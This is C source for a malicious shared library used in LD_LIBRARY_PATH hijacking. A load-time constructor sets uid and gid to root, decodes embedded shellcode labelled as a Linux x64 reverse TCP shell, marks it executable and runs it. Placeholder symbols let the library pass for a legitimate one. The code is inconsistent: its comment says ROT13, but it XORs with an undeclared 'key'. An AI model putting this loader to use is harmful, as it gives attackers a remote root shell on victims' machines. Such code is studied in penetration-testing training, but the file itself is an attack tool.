#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// Compile as follows
//gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c
//gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
// [...output from readelf here...]
int gpgrt_poll;

// ROT13-encoded 'linux/x64/shell_reverse_tcp' payload
char buf[] = "\x77\x36\x65\xa6\x77\x0f\x6c\x77\x0e\x6b\x1c\x12\x55\xa4\x55\xc6\x0f\x0d\x0d\x5d\xcd\xb5\x3e\x50\x5e\x55\x96\xf3\x77\x1d\x67\x77\x37\x65\x1c\x12\x77\x10\x6b\x55\x0c\xdb\x77\x2e\x65\x1c\x12\x82\x03\x77\x48\x65\xa6\x55\xc8\x3c\x6f\x76\x7b\x3c\x80\x75\x0d\x60\x55\x96\xf4\x5f\x64\x55\x96\xf3\x1c\x12";

void runmahpayload() {
        setuid(0);
        setgid(0);
        printf("Library hijacked!\n");
        int buf_len = (int) sizeof(buf);
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);
        int (*ret)() = (int(*)())buf;
        ret();
}